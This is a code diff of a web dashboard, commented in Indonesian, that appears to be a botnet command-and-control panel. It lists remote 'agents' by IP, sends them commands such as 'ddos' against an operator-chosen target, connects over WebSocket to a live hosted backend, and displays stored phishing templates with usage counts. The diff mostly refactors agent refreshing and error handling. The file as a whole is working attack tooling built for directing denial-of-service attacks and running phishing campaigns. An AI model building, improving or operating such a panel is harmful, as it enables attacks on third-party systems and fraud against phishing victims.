@@ -24,14 +24,9 @@
         <!-- 🎯 Weapon Control -->
         <div class="panel">
             <h2>⚔️ Control Agent</h2>
-            <label>Agent:</label>
-            <select id="agentSelect" style="width:100%; padding:5px; background:#333; color:#0f0; border:1px solid #0f0;">
-                <option value="">Memuat...</option>
-            </select><br>
-
-            <label>Target (opsional):</label>
-            <input type="text" id="targetInput" placeholder="IP/Domain" /><br>
-
+            <button onclick="refreshAgents()" class="btn">🔄 Refresh Agents</button>
+            <select id="agentSelect"><option value="">Memuat...</option></select><br>
+            <input type="text" id="targetInput" placeholder="Target (IP/Domain)" /><br>
             <button class="btn" onclick="sendCommand('ping')">📡 Ping</button>
             <button class="btn" onclick="sendCommand('ddos')">💥 DDoS</button>
             <button class="btn" onclick="sendCommand('block_ip')">🛡️ Block IP</button>
@@ -88,8 +83,8 @@
             logs.scrollTop = logs.scrollHeight;
         }
 
-        // WebSocket
-        const ws = new WebSocket("ws://localhost:8000/ws");
+        // WebSocket — GUNAKAN WSS://
+        const ws = new WebSocket("wss://throng-production.up.railway.app/ws");
         ws.onopen = () => addLog("🟢 Terhubung ke THE ORB");
         ws.onmessage = (e) => {
             const data = JSON.parse(e.data);
@@ -99,52 +94,57 @@
                 addLog(`💬 [${data.data.from}] ${data.data.message}`, "ai");
             } else if (data.type === "report") {
                 addLog(`📡 Agent ${data.data.agent_id} melapor`, "info");
-                updateAgents(); // Update langsung saat ada laporan
+                refreshAgents(); // Update langsung saat ada laporan
+            } else if (data.type === "command") {
+                addLog(`⚙️ Perintah dikirim ke ${data.data.agent_id}`, "info");
             }
         };
+        ws.onerror = (e) => addLog("🔴 WebSocket error");
+        ws.onclose = () => addLog("🔴 WebSocket ditutup, mencoba reconnect...");
 
-        // ============ UPDATE AGENT LIST ============
-        let selectedAgent = agentSelect.value;
+        // ============ REFRESH AGENTS ============
+        async function refreshAgents() {
+            try {
+                const res = await fetch("/api/agents");
+                if (!res.ok) throw new Error(`HTTP ${res.status}`);
+                
+                const data = await res.json();
+                const sel = document.getElementById("agentSelect");
+                
+                if (!data.agents || data.agents.length === 0) {
+                    sel.innerHTML = '<option value="">(Tidak ada agent)</option>';
+                    addLog("⚠️ Tidak ada agent terdaftar");
+                    return;
+                }
 
-        function updateAgents() {
-            fetch("/api/agents")
-                .then(r => r.json())
-                .then(data => {
-                    // Simpan pilihan
-                    const current = agentSelect.value;
+                // Update dropdown
+                let options = '<option value="">Pilih Agent</option>';
+                data.agents.forEach(a => {
+                    const idShort = a.agent_id.substring(0, 8);
+                    const selAttr = a.agent_id === sel.value ? "selected" : "";
+                    options += `<option value="${a.agent_id}" ${selAttr}>${idShort} (${a.ip})</option>`;
+                });
+                sel.innerHTML = options;
 
-                    // Update dropdown
-                    const options = ['<option value="">Pilih Agent</option>'];
-                    data.agents.forEach(a => {
-                        const sel = a.agent_id === current ? "selected" : "";
-                        options.push(`<option value="${a.agent_id}" ${sel}>${a.agent_id.substring(0,8)}... (${a.ip})</option>`);
-                    });
-                    agentSelect.innerHTML = options.join("");
+                // Update tabel
+                agentsTable.innerHTML = `<tr><th>ID</th><th>IP</th><th>Status</th><th>Last Seen</th></tr>`;
+                data.agents.forEach(a => {
+                    agentsTable.innerHTML += `
+                        <tr class="agent-row">
+                            <td>${a.agent_id.substring(0,8)}...</td>
+                            <td>${a.ip}</td>
+                            <td>${a.status}</td>
+                            <td>${a.last_seen}</td>
+                        </tr>
+                    `;
+                });
 
-                    // Update tabel
-                    agentsTable.innerHTML = `<tr><th>ID</th><th>IP</th><th>Status</th><th>Last Seen</th></tr>`;
-                    data.agents.forEach(a => {
-                        agentsTable.innerHTML += `
-                            <tr class="agent-row">
-                                <td>${a.agent_id.substring(0,8)}...</td>
-                                <td>${a.ip}</td>
-                                <td>${a.status}</td>
-                                <td>${a.last_seen}</td>
-                            </tr>
-                        `;
-                    });
-
-                    // Kembalikan pilihan jika masih ada
-                    if (current && data.agents.some(a => a.agent_id === current)) {
-                        agentSelect.value = current;
-                    }
-                })
-                .catch(err => console.error("Gagal ambil agent:", err));
+                addLog(`✅ ${data.agents.length} agent dimuat`);
+            } catch (err) {
+                addLog(`❌ Gagal ambil agent: ${err.message}`);
+                console.error(err);
+            }
         }
-
-        // Update setiap 3 detik
-        setInterval(updateAgents, 3000);
-        updateAgents(); // Pertama kali
 
         // ============ SEND COMMAND ============
         function sendCommand(action) {
@@ -156,9 +156,9 @@
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ agent_id: agent, command: action, target: target })
-            }).then(() => {
-                addLog(`⚔️ ${action} → ${agent}`);
-            });
+            })
+            .then(() => addLog(`⚔️ ${action} → ${agent}`))
+            .catch(err => addLog(`❌ Gagal kirim perintah: ${err.message}`));
         }
 
         // ============ NETWORK GRAPH ============
@@ -176,7 +176,8 @@
                     const dataVis = { nodes: new vis.DataSet(nodes), edges: new vis.DataSet(edges) };
                     const options = { physics: { enabled: true, stabilization: { iterations: 25 } } };
                     new vis.Network(container, dataVis, options);
-                });
+                })
+                .catch(err => console.error("Gagal update graph:", err));
         }
         updateNetwork();
         setInterval(updateNetwork, 10000);
@@ -195,7 +196,8 @@
                     document.getElementById("omega_log").innerHTML = d.dreams.map(x => `<p>🌀 ${x.content}</p>`).join("");
                     document.getElementById("dreams_log").innerHTML = d.dreams.map(x => `<p>💭 ${x.content}</p>`).join("");
                     document.getElementById("confessions_log").innerHTML = d.confessions.map(c => `<p>📜 ${c.failure}</p>`).join("");
-                });
+                })
+                .catch(err => console.error("Gagal load mind:", err));
 
             fetch("/api/phishing")
                 .then(r => r.json())
@@ -203,10 +205,15 @@
                     document.getElementById("phishing_list").innerHTML = d.templates.map(t => 
                         `<p>🎣 (${t.used_count}) ${t.template}</p>`
                     ).join("");
-                });
+                })
+                .catch(err => console.error("Gagal load phishing:", err));
         }
         loadData();
         setInterval(loadData, 60000);
+
+        // ============ AUTO REFRESH ============
+        setInterval(refreshAgents, 5000);
+        refreshAgents(); // Pertama kali
     </script>
 </body>
 </html>
